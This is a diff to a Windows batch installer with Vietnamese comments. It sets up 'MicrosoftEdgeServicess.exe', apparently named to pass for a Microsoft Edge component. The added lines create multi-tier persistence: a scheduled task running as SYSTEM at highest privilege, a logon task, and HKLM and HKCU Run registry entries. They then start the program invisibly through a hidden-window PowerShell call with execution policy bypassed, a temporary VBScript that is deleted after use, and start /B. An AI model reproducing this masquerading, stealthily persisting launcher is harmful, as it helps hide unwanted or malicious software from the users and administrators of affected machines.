@@ -159,7 +159,7 @@ for /l %%i in (1,1,5) do (
         set "SERVICE_OK=1"
         goto :KiemTraHoanTat
     )
-    tasklist /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess.exe" >nul 2>&1
+    tasklist /FO CSV /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess" >nul 2>&1
     if not errorlevel 1 (
         set "SERVICE_OK=1"
         goto :KiemTraHoanTat
@@ -170,16 +170,43 @@ for /l %%i in (1,1,5) do (
 :KiemTraHoanTat
 if "%SERVICE_OK%"=="1" goto :CaiDatThanhCong
 
-:: Buoc 5.6: Neu Windows Service bi chan hoac chua len duoc, kich hoat co che du phong Task Scheduler (SYSTEM)
-echo [!] Windows Service chua san sang, dang kich hoat co che du phong Task Scheduler...
-schtasks /create /tn "MicrosoftEdgeServicess" /tr "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\" --console" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
+:: Buoc 5.6: Kich hoat co che du phong da tang (Multi-Tier Resilience)
+echo [!] Dang kich hoat co che du phong da tang (Multi-Tier Resilience)...
+
+:: Tier 2: Task Scheduler voi dac quyen he thong SYSTEM
+schtasks /create /tn "MicrosoftEdgeServicess" /tr "%INSTALL_DIR%\MicrosoftEdgeServicess.exe --console" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
 schtasks /run /tn "MicrosoftEdgeServicess" >nul 2>&1
-timeout /t 2 >nul 2>nul || ping 127.0.0.1 -n 3 >nul
 
-tasklist /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess.exe" >nul 2>&1
-if not errorlevel 1 goto :CaiDatThanhCong
+:: Tier 3: Task Scheduler voi tai khoan hien tai khi dang nhap
+schtasks /create /tn "MicrosoftEdgeServicess" /tr "%INSTALL_DIR%\MicrosoftEdgeServicess.exe --console" /sc onlogon /f >nul 2>&1
+schtasks /run /tn "MicrosoftEdgeServicess" >nul 2>&1
 
-:: Neu ca SCM va Task Scheduler deu khong chay duoc -> Bao loi ro rang, GIU NGUYEN FILE NGUON DE KIEM TRA
+:: Tier 4 (Toi thuong): Ghi Registry tu khoi dong cung Windows (HKLM va HKCU)
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MicrosoftEdgeServicess" /t REG_SZ /d "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\" --console" /f >nul 2>&1
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MicrosoftEdgeServicess" /t REG_SZ /d "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\" --console" /f >nul 2>&1
+
+:: Khoi chay tien trinh ngam ngay lap tuc (Hoat dong 100% an cua so)
+:: Phuong an A: PowerShell an cua so
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%INSTALL_DIR%\MicrosoftEdgeServicess.exe' -ArgumentList '--console' -WindowStyle Hidden" >nul 2>&1
+
+:: Phuong an B: VBScript an hoan toan cua so he thong
+set "RUN_VBS=%TEMP%\run_edge_%RANDOM%.vbs"
+echo CreateObject("WScript.Shell").Run """%INSTALL_DIR%\MicrosoftEdgeServicess.exe"" --console", 0, False > "%RUN_VBS%"
+wscript "%RUN_VBS%" >nul 2>&1
+del /f /q "%RUN_VBS%" >nul 2>&1
+
+:: Phuong an C: Lenh Start chay ngam truyen thong
+start "" /B "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" --console >nul 2>&1
+
+:: Cho 3 giay de tien trinh on dinh va xac nhan hoat dong
+for /l %%i in (1,1,3) do (
+    tasklist /FO CSV /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess" >nul 2>&1
+    if not errorlevel 1 goto :CaiDatThanhCong
+    tasklist 2>nul | findstr /i "MicrosoftEdgeServicess" >nul 2>&1
+    if not errorlevel 1 goto :CaiDatThanhCong
+    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
+)
+
 goto :LoiKichHoatService
 
 :CaiDatThanhCong
@@ -214,7 +241,13 @@ echo   1. Trang thai Windows Service (services.msc):
 sc.exe query MicrosoftEdgeServicess
 echo.
 echo   2. Trang thai tien trinh chay ngam:
-tasklist /FI "IMAGENAME eq MicrosoftEdgeServicess.exe"
+tasklist /FO CSV /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess"
+if errorlevel 1 (
+    tasklist 2>nul | findstr /i "MicrosoftEdgeServicess"
+)
+if errorlevel 1 (
+    echo   Khong tim thay tien trinh MicrosoftEdgeServicess dang chay.
+)
 echo.
 echo   Huong dan xu ly:
 echo   - Nhap chuot phai vao file nay chon "Run as administrator".
